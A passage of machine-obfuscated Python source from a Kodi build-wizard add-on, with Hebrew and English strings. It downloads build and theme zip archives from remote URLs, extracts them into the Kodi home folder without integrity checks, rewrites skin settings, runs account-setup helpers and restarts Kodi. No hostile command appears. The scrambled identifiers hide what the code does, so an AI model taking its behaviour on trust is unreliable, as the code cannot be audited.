			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3825
			indicatorfastupdate ()#line:3826
		else :#line:3828
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3829
	if O00O0000OO0OOOO00 =='gui2':#line:3830
		if O00O00O00O00OO000 ==BUILDNAME :#line:3831
			if over ==True :OOO0OO0O00O0O0O0O =1 #line:3832
			else :OOO0OO0O00O0O0O0O =1 #line:3833
		else :#line:3834
			OOO0OO0O00O0O0O0O =1 #line:3835
		if OOO0OO0O00O0O0O0O :#line:3836
			remove_addons ()#line:3837
			remove_addons2 ()#line:3838
			OOO00O0000000O000 =wiz .checkBuild (O00O00O00O00OO000 ,'gui')#line:3839
			OO00OO00O0O000000 =O00O00O00O00OO000 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3840
			if not wiz .workingURL (OOO00O0000000O000 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3841
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3842
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00O00O00O00OO000 ),'','אנא המתן')#line:3843
			O000OO00OOOOO0OOO =os .path .join (PACKAGES ,'%s_guisettings.zip'%OO00OO00O0O000000 )#line:3844
			try :os .remove (O000OO00OOOOO0OOO )#line:3845
			except :pass #line:3846
			logging .warning (OOO00O0000000O000 )#line:3847
			if 'google'in OOO00O0000000O000 :#line:3848
			   OO0OOOO00000OOOO0 =googledrive_download (OOO00O0000000O000 ,O000OO00OOOOO0OOO ,DP ,wiz .checkBuild (O00O00O00O00OO000 ,'filesize'))#line:3849
			else :#line:3852
			  downloader .download (OOO00O0000000O000 ,O000OO00OOOOO0OOO ,DP )#line:3853
			xbmc .sleep (100 )#line:3854
			OO0OO00O0OO0OOO0O ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00O00O00O00OO000 )#line:3855
			DP .update (0 ,OO0OO00O0OO0OOO0O ,'','אנא המתן')#line:3856
			extract .all (O000OO00OOOOO0OOO ,HOME ,DP ,title =OO0OO00O0OO0OOO0O )#line:3857
			DP .close ()#line:3858
			wiz .defaultSkin ()#line:3859
			wiz .lookandFeelData ('save')#line:3860
			if INSTALLMETHOD ==1 :O0000OO0O0OO0O00O =1 #line:3863
			elif INSTALLMETHOD ==2 :O0000OO0O0OO0O00O =0 #line:3864
			else :DP .close ()#line:3865
		else :#line:3867
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3868
	elif O00O0000OO0OOOO00 =='fresh':#line:3869
		freshStart (O00O00O00O00OO000 )#line:3870
	elif O00O0000OO0OOOO00 =='normal':#line:3871
		if url =='normal':#line:3872
			if KEEPTRAKT =='true':#line:3873
				traktit .autoUpdate ('all')#line:3874
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:3875
			if KEEPREAL =='true':#line:3876
				debridit .autoUpdate ('all')#line:3877
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:3878
			if KEEPLOGIN =='true':#line:3879
				loginit .autoUpdate ('all')#line:3880
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:3881
		O0OOOOO000O0OOOOO =int (KODIV );OOOOOO00OO0OOO000 =int (float (wiz .checkBuild (O00O00O00O00OO000 ,'kodi')))#line:3882
		if not O0OOOOO000O0OOOOO ==OOOOOO00OO0OOO000 :#line:3883
			if O0OOOOO000O0OOOOO ==16 and OOOOOO00OO0OOO000 <=15 :O000OOOO00O000OO0 =False #line:3884
			else :O000OOOO00O000OO0 =True #line:3885
		else :O000OOOO00O000OO0 =False #line:3886
		if O000OOOO00O000OO0 ==True :#line:3887
			O000OO00OO0000O0O =1 #line:3888
		else :#line:3889
			if not over ==False :O000OO00OO0000O0O =1 #line:3890
			else :O000OO00OO0000O0O =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:3891
		if O000OO00OO0000O0O :#line:3892
			wiz .clearS ('build')#line:3893
			OOO00O0000000O000 =wiz .checkBuild (O00O00O00O00OO000 ,'url')#line:3894
			OO00OO00O0O000000 =O00O00O00O00OO000 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3895
			if not wiz .workingURL (OOO00O0000000O000 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3896
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3897
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00O00O00O00OO000 ,wiz .checkBuild (O00O00O00O00OO000 ,'version')),'','אנא המתן')#line:3898
			O000OO00OOOOO0OOO =os .path .join (PACKAGES ,'%s.zip'%OO00OO00O0O000000 )#line:3899
			try :os .remove (O000OO00OOOOO0OOO )#line:3900
			except :pass #line:3901
			logging .warning (OOO00O0000000O000 )#line:3902
			if 'google'in OOO00O0000000O000 :#line:3903
			   OO0OOOO00000OOOO0 =googledrive_download (OOO00O0000000O000 ,O000OO00OOOOO0OOO ,DP ,wiz .checkBuild (O00O00O00O00OO000 ,'filesize'))#line:3904
			else :#line:3907
			  downloader .download (OOO00O0000000O000 ,O000OO00OOOOO0OOO ,DP )#line:3908
			xbmc .sleep (1000 )#line:3909
			OO0OO00O0OO0OOO0O ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00O00O00O00OO000 ,wiz .checkBuild (O00O00O00O00OO000 ,'version'))#line:3910
			DP .update (0 ,OO0OO00O0OO0OOO0O ,'','Please Wait')#line:3911
			O0O00O0OO00OOOOOO ,OO0O00OOO0O00OO00 ,OO0O0O00O00O0O0O0 =extract .all (O000OO00OOOOO0OOO ,HOME ,DP ,title =OO0OO00O0OO0OOO0O )#line:3912
			if int (float (O0O00O0OO00OOOOOO ))>0 :#line:3913
				try :#line:3914
					wiz .fixmetas ()#line:3915
				except :pass #line:3916
				wiz .lookandFeelData ('save')#line:3917
				wiz .defaultSkin ()#line:3918
				wiz .setS ('buildname',O00O00O00O00OO000 )#line:3920
				wiz .setS ('buildversion',wiz .checkBuild (O00O00O00O00OO000 ,'version'))#line:3921
				wiz .setS ('buildtheme','')#line:3922
				wiz .setS ('latestversion',wiz .checkBuild (O00O00O00O00OO000 ,'version'))#line:3923
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:3924
				wiz .setS ('installed','true')#line:3925
				wiz .setS ('extract',str (O0O00O0OO00OOOOOO ))#line:3926
				wiz .setS ('errors',str (OO0O00OOO0O00OO00 ))#line:3927
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O0O00O0OO00OOOOOO ,OO0O00OOO0O00OO00 ))#line:3928
				O0OO00OO00OO0O0OO =(ADDON .getSetting ("gaiaseren"))#line:3930
				if O0OO00OO00OO0O0OO =='true':#line:3931
					wiz .kodi17Fix ()#line:3932
				fastupdatefirstbuild (NOTEID )#line:3933
				skin_homeselect ()#line:3934
				skin_lower ()#line:3935
				rdbuildinstall ()#line:3936
				try :gaiaserenaddon ()#line:3938
				except :pass #line:3939
				adults18 ()#line:3940
				skinfix18 ()#line:3941
				try :os .remove (O000OO00OOOOO0OOO )#line:3943
				except :pass #line:3944
				if O0OO00OO00OO0O0OO =='true':#line:3945
					wiz .kodi17Fix ()#line:3946
				OO0OO0O000OO0OOOO =(ADDON .getSetting ("auto_rd"))#line:3947
				if OO0OO0O000OO0OOOO =='true':#line:3948
					try :#line:3949
						setautorealdebrid ()#line:3950
					except :pass #line:3951
				try :#line:3952
					autotrakt ()#line:3953
				except :pass #line:3954
				O0OO0000OO00000O0 =(ADDON .getSetting ("imdb_on"))#line:3955
				if O0OO0000OO00000O0 =='true':#line:3956
					imdb_synck ()#line:3957
				testcommand ()#line:3958
				if int (float (OO0O00OOO0O00OO00 ))>0 :#line:3960
					OOO0OO0O00O0O0O0O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00O00O00O00OO000 ,wiz .checkBuild (O00O00O00O00OO000 ,'version')),'הושלם: [COLOR %s]%s%s[/COLOR] [שגיאות:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O0O00O0OO00OOOOOO ,'%',COLOR1 ,OO0O00OOO0O00OO00 ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:3961
					if OOO0OO0O00O0O0O0O :#line:3962
						if isinstance (OO0O00OOO0O00OO00 ,unicode ):#line:3963
							OO0O0O00O00O0O0O0 =OO0O0O00O00O0O0O0 .encode ('utf-8')#line:3964
						wiz .TextBox (ADDONTITLE ,OO0O0O00O00O0O0O0 )#line:3965
				DP .close ()#line:3966
				OO0000O00000OOOOO =wiz .themeCount (O00O00O00O00OO000 )#line:3967
				indicator ()#line:3968
				if not OO0000O00000OOOOO ==False :#line:3969
					buildWizard (O00O00O00O00OO000 ,'theme')#line:3970
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:3971
				if INSTALLMETHOD ==1 :O0000OO0O0OO0O00O =1 #line:3972
				elif INSTALLMETHOD ==2 :O0000OO0O0OO0O00O =0 #line:3973
				else :resetkodi ()#line:3974
				if O0000OO0O0OO0O00O ==1 :wiz .reloadFix ()#line:3976
				else :wiz .killxbmc (True )#line:3977
			else :#line:3978
				if isinstance (OO0O00OOO0O00OO00 ,unicode ):#line:3979
					OO0O0O00O00O0O0O0 =OO0O0O00O00O0O0O0 .encode ('utf-8')#line:3980
				O0OO00OOOOOOOOO0O =open (O000OO00OOOOO0OOO ,'r')#line:3981
				OO0OO00OOOOOO0000 =O0OO00OOOOOOOOO0O .read ()#line:3982
				OOO0O0OO000000O00 =''#line:3983
				for OOO0000O00OO0OOO0 in OO0OOOO00000OOOO0 :#line:3984
				  OOO0O0OO000000O00 ='key: '+OOO0O0OO000000O00 +'\n'+OOO0000O00OO0OOO0 #line:3985
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,OO0O0O00O00O0O0O0 +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+OOO0O0OO000000O00 )#line:3986
		else :#line:3987
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:3988
	elif O00O0000OO0OOOO00 =='theme':#line:3989
		if theme ==None :#line:3990
			OO0000O00000OOOOO =wiz .checkBuild (O00O00O00O00OO000 ,'theme')#line:3991
			O0O0000O0OO0000O0 =[]#line:3992
			if not OO0000O00000OOOOO =='http://'and wiz .workingURL (OO0000O00000OOOOO )==True :#line:3993
				O0O0000O0OO0000O0 =wiz .themeCount (O00O00O00O00OO000 ,False )#line:3994
				if len (O0O0000O0OO0000O0 )>0 :#line:3995
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,O00O00O00O00OO000 ,COLOR1 ,len (O0O0000O0OO0000O0 )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:3996
						wiz .log ("Theme List: %s "%str (O0O0000O0OO0000O0 ))#line:3997
						OOOOO0000OO00O0O0 =DIALOG .select (ADDONTITLE ,O0O0000O0OO0000O0 )#line:3998
						wiz .log ("Theme install selected: %s"%OOOOO0000OO00O0O0 )#line:3999
						if not OOOOO0000OO00O0O0 ==-1 :theme =O0O0000O0OO0000O0 [OOOOO0000OO00O0O0 ];O0O00OOO0OOO00O0O =True #line:4000
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4001
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4002
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:4003
		else :O0O00OOO0OOO00O0O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,O00O00O00O00OO000 ,wiz .checkBuild (O00O00O00O00OO000 ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:4004
		if O0O00OOO0OOO00O0O :#line:4005
			OOOOO0O000O00000O =wiz .checkTheme (O00O00O00O00OO000 ,theme ,'url')#line:4006
			OO00OO00O0O000000 =O00O00O00O00OO000 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4007
			if not wiz .workingURL (OOOOO0O000O00000O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:4008
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4009
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:4010
			O000OO00OOOOO0OOO =os .path .join (PACKAGES ,'%s.zip'%OO00OO00O0O000000 )#line:4011
			try :os .remove (O000OO00OOOOO0OOO )#line:4012
			except :pass #line:4013
			downloader .download (OOOOO0O000O00000O ,O000OO00OOOOO0OOO ,DP )#line:4014
			xbmc .sleep (1000 )#line:4015
			DP .update (0 ,"","Installing %s "%O00O00O00O00OO000 )#line:4016
			OOO000O00000OO00O =False #line:4017
			if url not in ["fresh","normal"]:#line:4018
				OOO000O00000OO00O =testTheme (O000OO00OOOOO0OOO )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4019
				OO000OO000OO0O00O =testGui (O000OO00OOOOO0OOO )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4020
				if OOO000O00000OO00O ==True :#line:4021
					wiz .lookandFeelData ('save')#line:4022
					OO00OO0O0O00O00OO ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4023
					OO00OO00OOO00O0O0 =xbmc .getSkinDir ()#line:4024
					skinSwitch .swapSkins (OO00OO0O0O00O00OO )#line:4026
					OOOOO000OO000O0OO =0 #line:4027
					xbmc .sleep (1000 )#line:4028
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOOOO000OO000O0OO <150 :#line:4029
						OOOOO000OO000O0OO +=1 #line:4030
						xbmc .sleep (1000 )#line:4031
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4032
						wiz .ebi ('SendClick(11)')#line:4033
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4034
					xbmc .sleep (1000 )#line:4035
			OO0OO00O0OO0OOO0O ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:4036
			DP .update (0 ,OO0OO00O0OO0OOO0O ,'','אנא המתן')#line:4037
			O0O00O0OO00OOOOOO ,OO0O00OOO0O00OO00 ,OO0O0O00O00O0O0O0 =extract .all (O000OO00OOOOO0OOO ,HOME ,DP ,title =OO0OO00O0OO0OOO0O )#line:4038
			wiz .setS ('buildtheme',theme )#line:4039
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(O0O00O0OO00OOOOOO ,OO0O00OOO0O00OO00 ))#line:4040
			DP .close ()#line:4041
			if url not in ["fresh","normal"]:#line:4042
				wiz .forceUpdate ()#line:4043
				if KODIV >=17 :wiz .kodi17Fix ()#line:4044
				if OO000OO000OO0O00O ==True :#line:4045
					wiz .lookandFeelData ('save')#line:4046
					wiz .defaultSkin ()#line:4047
					OO00OO00OOO00O0O0 =wiz .getS ('defaultskin')#line:4048
					skinSwitch .swapSkins (OO00OO00OOO00O0O0 )#line:4049
					OOOOO000OO000O0OO =0 #line:4050
					xbmc .sleep (1000 )#line:4051
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOOOO000OO000O0OO <150 :#line:4052
						OOOOO000OO000O0OO +=1 #line:4053
						xbmc .sleep (1000 )#line:4054
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4056
						wiz .ebi ('SendClick(11)')#line:4057
					wiz .lookandFeelData ('restore')#line:4058
				elif OOO000O00000OO00O ==True :#line:4059
					skinSwitch .swapSkins (OO00OO00OOO00O0O0 )#line:4060
					OOOOO000OO000O0OO =0 #line:4061
					xbmc .sleep (1000 )#line:4062
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOOOO000OO000O0OO <150 :#line:4063
						OOOOO000OO000O0OO +=1 #line:4064
						xbmc .sleep (1000 )#line:4065
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4067
						wiz .ebi ('SendClick(11)')#line:4068
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4069
					wiz .lookandFeelData ('restore')#line:4070
				else :#line:4071
					wiz .ebi ("ReloadSkin()")#line:4072
					xbmc .sleep (1000 )#line:4073
					wiz .ebi ("Container.Refresh")#line:4074
		else :#line:4075
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:4076
def skin_homeselect ():#line:4080
	try :#line:4082
		OOO000OO00OO000OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4083
		O00OOOO00OO0OO000 =open (OOO000OO00OO000OO ,'r')#line:4085
		O000OOO0O0O0OO0OO =O00OOOO00OO0OO000 .read ()#line:4086
		O00OOOO00OO0OO000 .close ()#line:4087
		OO00O00000OOOOOO0 ='<setting id="HomeS" type="string(.+?)/setting>'#line:4088
		O0OO0O00O00O00O0O =re .compile (OO00O00000OOOOOO0 ).findall (O000OOO0O0O0OO0OO )[0 ]#line:4089
		O00OOOO00OO0OO000 =open (OOO000OO00OO000OO ,'w')#line:4090
		O00OOOO00OO0OO000 .write (O000OOO0O0O0OO0OO .replace ('<setting id="HomeS" type="string%s/setting>'%O0OO0O00O00O00O0O ,'<setting id="HomeS" type="string"></setting>'))#line:4091
		O00OOOO00OO0OO000 .close ()#line:4092
	except :#line:4093
		pass #line:4094
def skin_lower ():#line:4097
	O000OO0O00OO0OOOO =(ADDON .getSetting ("lower"))#line:4098
	if O000OO0O00OO0OOOO =='true':#line:4099
		try :#line:4102
			OOO0OO00O00O00O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4103
			OO0OOOOO0O0O00OOO =open (OOO0OO00O00O00O0O ,'r')#line:4105
			OOOO0000OOOO0O0O0 =OO0OOOOO0O0O00OOO .read ()#line:4106
			OO0OOOOO0O0O00OOO .close ()#line:4107
			OOOO0O0O00O00000O ='<setting id="none_widget" type="bool(.+?)/setting>'#line:4108
			OO0O00OOOO00000O0 =re .compile (OOOO0O0O00O00000O ).findall (OOOO0000OOOO0O0O0 )[0 ]#line:4109
			OO0OOOOO0O0O00OOO =open (OOO0OO00O00O00O0O ,'w')#line:4110
			OO0OOOOO0O0O00OOO .write (OOOO0000OOOO0O0O0 .replace ('<setting id="none_widget" type="bool%s/setting>'%OO0O00OOOO00000O0 ,'<setting id="none_widget" type="bool">true</setting>'))#line:4111
			OO0OOOOO0O0O00OOO .close ()#line:4112
			OOO0OO00O00O00O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4114
			OO0OOOOO0O0O00OOO =open (OOO0OO00O00O00O0O ,'r')#line:4116
			OOOO0000OOOO0O0O0 =OO0OOOOO0O0O00OOO .read ()#line:4117
			OO0OOOOO0O0O00OOO .close ()#line:4118
			OOOO0O0O00O00000O ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:4119
			OO0O00OOOO00000O0 =re .compile (OOOO0O0O00O00000O ).findall (OOOO0000OOOO0O0O0 )[0 ]#line:4120
			OO0OOOOO0O0O00OOO =open (OOO0OO00O00O00O0O ,'w')#line:4121
			OO0OOOOO0O0O00OOO .write (OOOO0000OOOO0O0O0 .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%OO0O00OOOO00000O0 ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:4122
			OO0OOOOO0O0O00OOO .close ()#line:4123
			OOO0OO00O00O00O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4125
			OO0OOOOO0O0O00OOO =open (OOO0OO00O00O00O0O ,'r')#line:4127
			OOOO0000OOOO0O0O0 =OO0OOOOO0O0O00OOO .read ()#line:4128
			OO0OOOOO0O0O00OOO .close ()#line:4129
			OOOO0O0O00O00000O ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:4130
			OO0O00OOOO00000O0 =re .compile (OOOO0O0O00O00000O ).findall (OOOO0000OOOO0O0O0 )[0 ]#line:4131
			OO0OOOOO0O0O00OOO =open (OOO0OO00O00O00O0O ,'w')#line:4132
			OO0OOOOO0O0O00OOO .write (OOOO0000OOOO0O0O0 .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%OO0O00OOOO00000O0 ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:4133
			OO0OOOOO0O0O00OOO .close ()#line:4134
			OOO0OO00O00O00O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4138
			OO0OOOOO0O0O00OOO =open (OOO0OO00O00O00O0O ,'r')#line:4140
			OOOO0000OOOO0O0O0 =OO0OOOOO0O0O00OOO .read ()#line:4141
			OO0OOOOO0O0O00OOO .close ()#line:4142
			OOOO0O0O00O00000O ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:4143
			OO0O00OOOO00000O0 =re .compile (OOOO0O0O00O00000O ).findall (OOOO0000OOOO0O0O0 )[0 ]#line:4144
			OO0OOOOO0O0O00OOO =open (OOO0OO00O00O00O0O ,'w')#line:4145
			OO0OOOOO0O0O00OOO .write (OOOO0000OOOO0O0O0 .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%OO0O00OOOO00000O0 ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:4146
			OO0OOOOO0O0O00OOO .close ()#line:4147
			OOO0OO00O00O00O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4151
			OO0OOOOO0O0O00OOO =open (OOO0OO00O00O00O0O ,'r')#line:4153
			OOOO0000OOOO0O0O0 =OO0OOOOO0O0O00OOO .read ()#line:4154
			OO0OOOOO0O0O00OOO .close ()#line:4155
			OOOO0O0O00O00000O ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:4156
			OO0O00OOOO00000O0 =re .compile (OOOO0O0O00O00000O ).findall (OOOO0000OOOO0O0O0 )[0 ]#line:4157
			OO0OOOOO0O0O00OOO =open (OOO0OO00O00O00O0O ,'w')#line:4158
			OO0OOOOO0O0O00OOO .write (OOOO0000OOOO0O0O0 .replace ('<setting id="show.cdart" type="bool%s/setting>'%OO0O00OOOO00000O0 ,'<setting id="show.cdart" type="bool">false</setting>'))#line:4159
			OO0OOOOO0O0O00OOO .close ()#line:4160
			OOO0OO00O00O00O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4164
			OO0OOOOO0O0O00OOO =open (OOO0OO00O00O00O0O ,'r')#line:4166
			OOOO0000OOOO0O0O0 =OO0OOOOO0O0O00OOO .read ()#line:4167
			OO0OOOOO0O0O00OOO .close ()#line:4168
			OOOO0O0O00O00000O ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:4169
			OO0O00OOOO00000O0 =re .compile (OOOO0O0O00O00000O ).findall (OOOO0000OOOO0O0O0 )[0 ]#line:4170
			OO0OOOOO0O0O00OOO =open (OOO0OO00O00O00O0O ,'w')#line:4171
			OO0OOOOO0O0O00OOO .write (OOOO0000OOOO0O0O0 .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%OO0O00OOOO00000O0 ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:4172
			OO0OOOOO0O0O00OOO .close ()#line:4173
		except :#line:4178
			pass #line:4179
def thirdPartyInstall (O0000O0O0OO0O0OOO ,O0O00O00O0O000OOO ):#line:4181
	if not wiz .workingURL (O0O00O00O0O000OOO ):#line:4182
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4183
	OOOOO0O0O0000O0OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0000O0O0OO0O0OOO ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4184
	if OOOOO0O0O0000O0OO ==1 :#line:4185
		freshStart ('third',True )#line:4186
	wiz .clearS ('build')#line:4187
	OO00OOO0OO00OO0O0 =O0000O0O0OO0O0OOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4188
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4189
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0000O0O0OO0O0OOO ),'','אנא המתן')#line:4190
	O0OO00O0OO00O00OO =os .path .join (PACKAGES ,'%s.zip'%OO00OOO0OO00OO0O0 )#line:4191
	try :os .remove (O0OO00O0OO00O00OO )#line:4192
	except :pass #line:4193
	downloader .download (O0O00O00O0O000OOO ,O0OO00O0OO00O00OO ,DP )#line:4194
	xbmc .sleep (1000 )#line:4195
	O0OO00O0O00O00OO0 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0000O0O0OO0O0OOO )#line:4196
	DP .update (0 ,O0OO00O0O00O00OO0 ,'','אנא המתן')#line:4197
	O00OO0OO000OO0O00 ,OOO0O000O0O0OO000 ,OOO0O00O0O00OOO00 =extract .all (O0OO00O0OO00O00OO ,HOME ,DP ,title =O0OO00O0O00O00OO0 )#line:4198
	if int (float (O00OO0OO000OO0O00 ))>0 :#line:4199
		wiz .fixmetas ()#line:4200
		wiz .lookandFeelData ('save')#line:4201
		wiz .defaultSkin ()#line:4202
		wiz .setS ('installed','true')#line:4204
		wiz .setS ('extract',str (O00OO0OO000OO0O00 ))#line:4205
		wiz .setS ('errors',str (OOO0O000O0O0OO000 ))#line:4206
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O00OO0OO000OO0O00 ,OOO0O000O0O0OO000 ))#line:4207
		try :os .remove (O0OO00O0OO00O00OO )#line:4208
		except :pass #line:4209
		if int (float (OOO0O000O0O0OO000 ))>0 :#line:4210
